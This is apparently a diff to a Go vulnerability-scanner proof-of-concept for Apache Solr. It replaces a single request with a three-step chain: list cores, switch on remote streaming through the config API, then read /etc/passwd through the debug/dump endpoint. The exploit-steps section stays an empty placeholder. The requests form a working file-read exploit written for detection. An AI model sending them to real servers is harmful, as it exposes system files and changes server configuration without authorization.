@@ -29,42 +29,8 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "POST",
-        "uri": "/solr/core/debug/dump?param=ContentStreams",
-        "follow_redirect": true,
-        "header": {},
-        "data_type": "text",
-        "data": "stream.url=file:///etc/passwd"
-      },
-      "ResponseTest": {
-        "type": "group",
-        "operation": "AND",
-        "checks": [
-          {
-            "type": "item",
-            "variable": "$code",
-            "operation": "==",
-            "value": "200",
-            "bz": ""
-          },
-          {
-            "type": "item",
-            "variable": "$body",
-            "operation": "contains",
-            "value": "root:x:0",
-            "bz": ""
-          }
-        ]
-      },
-      "SetVariable": []
-    }
-  ],
-  "ExploitSteps": [
-    "AND",
-    {
-      "Request": {
         "method": "GET",
-        "uri": "/test.php",
+        "uri": "/solr/admin/cores?indexInfo=false&wt=json",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -85,7 +51,107 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "test",
+            "value": "responseHeader",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "core_name|lastbody|regex|\"name\":\"(.*?)\""
+      ]
+    },
+    {
+      "Request": {
+        "method": "POST",
+        "uri": "/solr/{{{core_name}}}/config",
+        "follow_redirect": true,
+        "header": {
+          "Content-Type": "application/json"
+        },
+        "data_type": "text",
+        "data": "{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "responseHeader",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "POST",
+        "uri": "/solr/{{{core_name}}}/debug/dump?param=ContentStreams",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": "stream.url=file:///etc/passwd"
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "root",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "",
             "bz": ""
           }
         ]
